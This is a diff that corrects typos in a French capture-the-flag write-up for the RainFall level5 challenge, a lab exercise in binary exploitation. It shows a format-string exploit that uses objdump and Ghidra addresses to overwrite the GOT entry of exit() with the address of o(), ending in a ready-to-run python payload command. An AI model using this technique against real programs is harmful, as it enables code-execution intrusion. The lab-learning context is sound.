@@ -28,7 +28,7 @@ void main(void)
 }
 ```
 
-Le probleme dans ce niveau c'est que la fonction `n()` ne n'utilise pas de mot clef `return` donc nous ne pouvons pas ecraser l'adresse de retour pour utiliser celle de `o()`. Par contre nous pouvons remplacer l'adresse de `exit()` dans la GOT (Global Offset Table) pour la remplacer par celle de `o()`.
+Le probleme dans ce niveau c'est que la fonction `n()` n'utilise pas de mot clef `return` donc nous ne pouvons pas ecraser l'adresse de retour pour utiliser celle de `o()`. Par contre nous pouvons remplacer l'adresse de `exit()` dans la GOT (Global Offset Table) pour la remplacer par celle de `o()`.
 
 Nous avons donc besoin de l'adresse de `exit()`:
 
@@ -40,7 +40,7 @@ level5@RainFall:~$ objdump -R ./level5 | grep exit
 
 Ceci nous donne l'adresse de `exit()`: `08049838`. Nous savons donc que nous devons ecraser la valeur a cette adresse. Grace a Ghidra nous pouvons voir que l'adresse de `o()` est `080484a4`
 
-En utilisant le meme principe que la partie precedente et en convertissant `` en decimale nous pouvons construire cette commande: `080484a4`
+En utilisant le meme principe que la partie precedente et en convertissant `080484a4` en decimale nous pouvons construire cette commande:
 
 ```bash
 (python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' ; cat) | ./level5
